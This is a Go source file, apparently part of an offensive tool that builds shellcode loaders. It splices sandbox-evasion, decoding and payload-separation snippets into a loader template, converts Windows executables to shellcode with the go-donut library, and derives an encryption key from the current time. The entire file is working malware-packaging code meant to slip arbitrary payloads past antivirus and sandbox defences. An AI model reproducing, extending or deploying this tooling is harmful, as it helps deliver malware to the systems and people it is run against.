package core

import (
	"github.com/Binject/go-donut/donut"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"
	"time"
)

//给loader文件插入代码，需注意import的库需要去重
func addext(Timestart []string, method string) {
	loaderfilebyte, _ := ioutil.ReadFile(path.Join(TEMP_DIR, "main.go"))
	loaderfile := string(loaderfilebyte)
	//fmt.Printf("%q", strings.Split(loaderfile, "//__IMPORT__")[0])
	//println(len(strings.Split(loaderfile, "//__IMPORT__")))
	var replacestring string
	switch method {
	case "sandbox":
		replacestring = "//__SANDBOX__"
	case "decode":
		replacestring = "//__DECODE__"
	case "fenli":
		replacestring = "//__FENLI__"
	}
	loaderfile = strings.Replace(loaderfile, replacestring, Timestart[0], 1)
	//loaderfile = strings.Replace(loaderfile, "//__IMPORT__", Timestart[1], 1)
	var importfield = strings.SplitAfter(loaderfile, "//__IMPORT__")[0]
	unimportfield := strings.SplitAfter(loaderfile, "//__IMPORT__")[1]
	imports := strings.Split(importfield, "\n")
	new := make([]string, 0)
	for i := 0; i < len(imports); i++ {
		if strings.Index(Timestart[1], imports[i]) == -1 {
			new = append(new, imports[i]+"\n")
		}
	}
	new = append(new, "\t//__IMPORT__\n")
	//fmt.Printf("%q\n", imports)
	//fmt.Printf("%q\n", new)
	//println(importfield)
	final := strings.Replace(strings.Join(new, "")+unimportfield, "//__IMPORT__", Timestart[1], 1)
	//println(final)
	ioutil.WriteFile(path.Join(TEMP_DIR, "main.go"), []byte(final), os.ModePerm)
}

func PE2shellcode(srcFile string) {
	donutconfig := donut.DefaultConfig()
	payload, err := donut.ShellcodeFromFile(srcFile, donutconfig)
	if err != nil {
		log.Println(err)
	}
	err = ioutil.WriteFile(path.Join(TEMP_DIR, "shellcode"), payload.Bytes(), os.ModePerm)
	if err != nil {
		log.Println(err)
	}
}

func generatekey() []byte {
	key := (time.Now().String()[5:27])
	err := ioutil.WriteFile(path.Join(TEMP_DIR, "key"), []byte(key), os.ModePerm)
	if err != nil {
		log.Println(err)
	}
	return []byte(key)
}
